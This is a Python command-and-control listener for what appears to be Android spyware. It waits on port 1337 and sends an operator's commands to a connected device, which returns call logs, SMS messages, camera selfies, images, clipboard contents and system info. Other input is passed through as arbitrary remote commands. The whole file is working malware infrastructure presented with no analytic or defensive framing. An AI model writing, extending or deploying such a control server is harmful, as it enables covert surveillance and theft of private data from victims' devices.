#!/usr/bin/env python3

import os
import socket
import base64

HOST = '0.0.0.0'
PORT = 1337
END_HEADER = "POPPETX321"

server_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_soc.bind((HOST, PORT))
server_soc.listen(1)
print("Listening for connections.... ")

conn, addr = server_soc.accept()
print("Connection from " + str(addr))
connectionTest = conn.recv(1024).decode("UTF-8")
print("From " + str(addr) + " : " + str(connectionTest))

# Just some function to be used here and there
def recvall(sock):
    data = ""
    buffer = ""
    while END_HEADER not in data:
        buffer = sock.recv(1024).decode("UTF-8", "ignore")
        data += buffer
    return data   

#Give Base64 String and get image in current dir (aap chronology samjhiye)
def makeImage(String):
    
    return String

while True:
    dataSend = input(">>>") + "\n"
    print("Executing command.. "+dataSend)

    if dataSend.strip() == "end":
        conn.send(dataSend.encode("UTF-8"))
        conn.close()
        break
    
    elif dataSend.strip() == "getCallLogs":
        conn.send(dataSend.encode("UTF-8"))
        print(str(recvall(conn)))
    
    elif dataSend.strip() == "getImage":
        conn.send(dataSend.encode("UTF-8"))
        print(str(recvall(conn)))

    elif dataSend.strip() == "getSelfie":
        conn.send(dataSend.encode("UTF-8"))
        print(str(recvall(conn)))   

    elif dataSend.strip() == "getSystemInfo":
        conn.send(dataSend.encode("UTF-8"))
        print("System Info of " + str(addr) + "\n" + str(recvall(conn)))
    
    elif dataSend.strip() == "getMessages":
        conn.send(dataSend.encode("UTF-8"))
        print(str(recvall(conn)))

    elif dataSend.strip() == "getClipBoardContent":
        conn.send(dataSend.encode("UTF-8"))
        print(str(recvall(conn)))

    else:    
        conn.send(dataSend.encode("UTF-8"))
        print(conn.recv(1024).decode("UTF-8"))
        

conn.close()